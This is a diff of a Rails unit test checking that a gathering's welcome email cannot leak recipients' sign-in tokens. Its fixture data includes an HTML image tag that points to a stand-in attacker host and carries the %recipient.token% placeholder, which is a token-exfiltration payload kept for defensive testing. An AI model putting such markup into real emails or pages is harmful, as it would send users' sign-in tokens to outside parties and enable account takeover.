@@ -173,14 +173,14 @@ class GatheringsTest < ActiveSupport::TestCase
   test 'gathering welcome email cannot exfiltrate a sign-in token via an image' do
     create_gathering
     @gathering.set(
-      name: '<img src="https://attacker.example/%recipient.token%">',
       welcome_email: '<p>Hi</p><img src="https://attacker.example/%recipient.token%"><p>%gathering.name%</p><p>%sign_in_details%</p>'
     )
-    safe_gathering_name = ERB::Util.html_escape(EmailHelper.strip_recipient_secrets(@gathering.name))
+    @gathering.update!(name: 'Gathering %recipient.token%')
+    assert_equal 'Gathering', @gathering.name
     sign_in_details = %(<a href="#{ENV['BASE_URI']}/g/#{@gathering.slug}?sign_in_token=%recipient.token%">Sign in</a>)
     html = EmailHelper.html(content: @gathering.welcome_email) do |content|
       EmailHelper.replace_youtube_oembeds(content)
-                 .gsub('%gathering.name%', safe_gathering_name)
+                 .gsub('%gathering.name%', @gathering.name)
                  .gsub('%sign_in_details%', sign_in_details)
     end
 
